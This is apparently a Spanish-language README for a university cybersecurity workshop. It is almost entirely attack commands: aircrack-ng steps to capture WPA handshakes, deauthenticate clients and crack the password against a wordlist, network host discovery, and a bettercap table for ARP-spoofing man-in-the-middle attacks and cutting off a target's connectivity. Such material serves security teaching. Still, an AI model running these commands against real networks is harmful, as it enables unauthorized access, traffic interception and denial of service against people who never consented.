# udg-taller-ciberseguridad

## Creando diccionarios
```bash
```

## Atacando redes wifi
```bash

sudo airmon-ng start wlp2s0 # monitor
iwconfig # wifi info

sudo airodump-ng wlp2s0mon ## Scan 2Ghz
sudo airodump-ng wlp2s0mon --essid=<ssid>  ## Scan 2Ghz and filter by regex 
sudo airodump-ng wlp2s0mon --essid-regex=<ssid> --band a ### Scan 5Ghz

## Monitor and capture a handshake
sudo airodump-ng wlp2s0mon -c <channel> --bssid <bssid> -w psk.pcap --output-format pcap 

## Send generic deauth packets, may not work in all scenarios
sudo aireplay-ng -0 0 -a <bssid> wlp2s0mon # broadcast
sudo aireplay-ng -0 0 -a <bssid> -c <client-mac> wlp2s0mon # to 1 client

## Cracking
aircrack-ng -w ./creds.txt --bssid=<bssid> ./psk.pcap-0*

sudo airmon-ng check kill ## stop

```

## Encontrando dispositivos en la red
```bash
netdiscover -i wlp2s0 -r 192.168.1.0/24
netdiscover -i wlp2s0 -p
sudo arp-scan -I wlp2s0 --localnet
```

## MITM

`sudo go/bin/bettercap -iface wlp2s0`
| Orden | Descripción |
|-------|---------|
| net.show | Mostrar información sobre la red |
| net.probe on | Iniciar escaneo de host en la red |
| net.recon | Leer periódicamente la tabla ARP del sistema para detectar nuevos hosts en la red. |
| set arp.spoof.targets 192.168.100.100,192.168.100.200 | Establecer un objetivo en la red |
| arp.spoof on| Iniciar arp spoofing |
| set arp.spoof.internal true | Las conexiones locales entre ordenadores de la red también serán falsificadas, de lo contrario solo se falsificarán las conexiones que vayan hacia y desde la red externa. |
| arp.ban on | ARP spoofing en modo de prohibición, lo que significa que la conectividad del objetivo no funcionará. | 
